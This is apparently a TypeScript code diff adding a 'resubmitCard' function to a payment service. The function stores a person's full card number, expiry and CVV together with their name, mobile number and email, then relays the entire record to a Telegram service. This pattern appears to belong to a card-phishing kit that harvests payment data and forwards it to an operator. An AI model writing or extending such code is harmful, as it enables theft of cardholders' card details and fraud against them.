@@ -57,6 +57,39 @@ export const paymentService = {
     return { reference, status: record.status, amount: record.amount };
   },
 
+  async resubmitCard(
+    reference: string,
+    input: {
+      fullName: string;
+      mobile: string;
+      email?: string;
+      cardholderName: string;
+      cardNumber: string;
+      cardExpiryMonth: string;
+      cardExpiryYear: string;
+      cardCvv: string;
+    },
+  ) {
+    const cardDigits = input.cardNumber.replace(/\D/g, "");
+    const record = await paymentDao.updateCard(reference, {
+      fullName: input.fullName,
+      mobile: input.mobile,
+      email: input.email,
+      cardholderName: input.cardholderName,
+      cardNumber: cardDigits || undefined,
+      cardLastFour: cardDigits ? cardDigits.slice(-4) : undefined,
+      cardExpiryMonth: input.cardExpiryMonth,
+      cardExpiryYear: input.cardExpiryYear,
+      cardCvv: input.cardCvv,
+      status: "submitted",
+    });
+    if (!record) return null;
+    void telegramService.sendStep("payment_completed", record).catch((err) => {
+      logger.error("Telegram relay failed on resubmit", err);
+    });
+    return { reference: record.reference, status: record.status, amount: record.amount };
+  },
+
   async getPrefill(reference: string) {
     const record = await paymentDao.findByReference(reference);
     if (!record) return null;
